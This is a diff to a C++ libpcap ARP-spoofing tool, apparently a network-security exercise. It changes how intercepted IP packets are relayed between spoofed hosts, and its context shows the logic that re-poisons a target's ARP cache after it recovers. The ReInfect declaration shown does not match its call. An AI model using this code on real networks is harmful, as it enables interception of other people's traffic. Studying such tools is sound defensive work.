@@ -32,7 +32,7 @@ void GetMyInfo(Ip* myIp, Mac* myMac, char* dev);
 Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip);
 EthArpPacket MakeArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
 void SendArpPacket(pcap_t* handle, EthArpPacket packet);
-void SendIpPacket(pcap_t* handle, EthIpPacket packet, int size);
+void SendIpPacket(pcap_t* handle, const u_char* replyPacket, int size);
 bool isSpoofed(const u_char *replyPacket, FlowInfo info);
 bool isRecovered(const u_char *replyPacket, FlowInfo info);
 bool ReInfect(const u_char *replyPacket, FlowInfo info);
@@ -147,8 +147,8 @@ void SendArpPacket(pcap_t* handle, EthArpPacket packet){
 	return;
 }
 
-void SendIpPacket(pcap_t* handle, EthIpPacket packet, int size){
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), size);
+void SendIpPacket(pcap_t* handle, const u_char *replyPacket, int size){
+	int res = pcap_sendpacket(handle, replyPacket, size);
 	if (res != 0) {
 		fprintf(stderr, "Send Ip Failed return %d error=%s\n", res, pcap_geterr(handle));
 	}
@@ -215,7 +215,7 @@ void Relay(pcap_t* handle, struct pcap_pkthdr* header, const u_char *replyPacket
 	EthIpPacket *ipPacket = (struct EthIpPacket *)replyPacket;
 	ipPacket->eth_.smac_ = info.attackerMac;
 	ipPacket->eth_.dmac_ = info.targetMac;
-	SendIpPacket(handle, *ipPacket, header->len);
+	SendIpPacket(handle, replyPacket, header->len);
 	printf("Relay : [%s]\n",std::string(info.senderIp).c_str());
 }
 
@@ -235,7 +235,7 @@ void Receive(pcap_t* handle){
 			if(isSpoofed(replyPacket, iter))
 				Relay(handle, header, replyPacket, iter);
 			// recovered -> reinfect
-			if(isRecovered(replyPacket,iter))
+			if(isRecovered(replyPacket, iter))
 				ReInfect(handle, iter);
 		}
 	}
